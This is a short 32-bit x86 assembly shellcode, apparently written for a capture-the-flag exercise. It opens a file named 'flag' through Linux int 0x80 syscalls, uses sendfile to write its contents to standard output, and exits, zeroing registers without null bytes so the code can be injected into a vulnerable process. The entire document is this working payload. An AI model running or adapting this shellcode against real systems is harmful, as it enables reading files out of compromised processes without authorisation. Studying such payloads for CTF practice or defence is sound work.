BITS 32
global _start
_start:
	xor ecx,ecx
	mul ecx
	push ecx
	push 0x67616c66
	mov ebx,esp
	mov al,0x5
	int 0x80
	
	mov ecx, eax
	xor ebx, ebx
	mul ebx
	inc ebx
	mov al, 0xbb
	mov esi, eax
	shl esi, 8
	int 0x80
	
	mov eax,1
	int 0x80
	
	
	
